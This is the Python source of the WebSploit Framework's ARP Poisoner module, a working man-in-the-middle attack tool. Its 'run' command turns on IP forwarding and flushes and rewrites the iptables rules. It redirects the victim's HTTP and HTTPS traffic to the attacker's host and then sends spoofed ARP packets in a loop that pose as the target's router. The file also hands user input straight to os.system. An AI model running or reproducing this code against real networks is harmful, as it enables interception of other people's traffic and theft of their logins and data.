#!/usr/bin/env python
#
# WebSploit Framework ARP Poisoner module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com

import os
import subprocess
from core import help
from core import wcolors
from scapy.all import *
from time import sleep

options = ["eth0", "192.168.1.1", "192.168.1.2", "192.168.1.3"]
def arp_poisoner():
    try:
        line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
        line_1 += ":"
        line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "ARP_Poisoner" + wcolors.color.ENDC
        line_1 += " > "
        com = raw_input(line_1)
        com = com.lower()
        if com[0:13] == 'set interface':
            options[0] = com[14:20]
            print "INTERFACE => ",options[0]
            arp_poisoner()
        elif com[0:10] == 'set router':
            options[1] = com[11:26]
            print "ROUTER => ", options[1]
            arp_poisoner()
        elif com[0:10] == 'set target':
            options[2] = com[11:26]
            print "TARGET => ", options[2]
            arp_poisoner()
        elif com[0:9] =='set lhost':
            options[3] = com[10:25]
            print "LHOST => ", options[3]
            arp_poisoner()
        elif com[0:2] =='os':
            os.system(com[3:])
            arp_poisoner()
        elif com[0:4] =='help':
            help.help()
            arp_poisoner()
        elif com[0:4] =='back':
            pass
        elif com[0:12] =='show options':
            print ""
            print "Options\t\t Value\t\t\t\t RQ\t Description"
            print "---------\t--------------\t\t\t----\t--------------"
            print "Interface\t"+options[0]+"\t\t\t\tyes\tNetwork Interface Name"
            print "ROUTER\t\t"+options[1]+"\t\t\tyes\tRouter IP Address"
            print "TARGET\t\t"+options[2]+"\t\t\tyes\tTarget IP Address"
            print "LHOST\t\t"+options[3]+"\t\t\tyes\tLocal IP Address"
            print ""
            arp_poisoner()
        elif com[0:3] =='run':
            print (wcolors.color.BLUE + "[*]Setting Up ..." + wcolors.color.ENDC)
            exec1 = "echo 1 > /proc/sys/net/ipv4/ip_forward"
            exec2 = "echo 0 > /proc/sys/net/ipv4/conf/%s/send_redirects" % (options[0])
            exec3 = "iptables --flush"
            exec4 = "iptables --zero"
            exec5 = "iptables --delete-chain"
            exec6 = "iptables -F -t nat"
            exec7 = "iptables --append FORWARD --in-interface %s --jump ACCEPT" % (options[0])
            exec8 = "iptables --table nat --append POSTROUTING --out-interface %s --jump MASQUERADE" % (options[0])
            exec9 = "iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination %s" % (options[3])
            exec10= "iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination %s" % (options[3])
            print(wcolors.color.BLUE + "[*]IP Forwarding ... " + wcolors.color.ENDC),
            subprocess.Popen(exec1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            subprocess.Popen(exec2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            sleep(0.5)
            print(wcolors.color.GREEN + "[OK]" + wcolors.color.ENDC)
            print(wcolors.color.BLUE + "[*]Configuring Iptables ... " + wcolors.color.ENDC),
            subprocess.Popen(exec3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            subprocess.Popen(exec4, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            subprocess.Popen(exec5, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            subprocess.Popen(exec6, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            subprocess.Popen(exec7, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            subprocess.Popen(exec8, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            sleep(0.5)
            print(wcolors.color.GREEN + "[OK]" + wcolors.color.ENDC)
            print(wcolors.color.BLUE + "[*]Redirect Traffic on %s ... " + wcolors.color.ENDC) % (options[3]),
            subprocess.Popen(exec9, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            subprocess.Popen(exec10, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            sleep(0.5)
            print(wcolors.color.GREEN + "[OK]" + wcolors.color.ENDC)
            sleep(1)
            print(wcolors.color.BLUE + "[*]ARP Poisoning Has Been Started ..." + wcolors.color.ENDC)
            packet = ARP()
            packet.psrc = options[1]
            packet.pdst = options[2]
            try:
                while 1:
                    send(packet, verbose=0)
                    sleep(50)
            except:
                print (wcolors.color.RED + "[!]Something Wrong , Cannot Send Packet!")
                pass
    except(KeyboardInterrupt):
        print(wcolors.color.RED + "\n[*] (Ctrl + C ) Detected, Module Exit" + wcolors.color.ENDC)
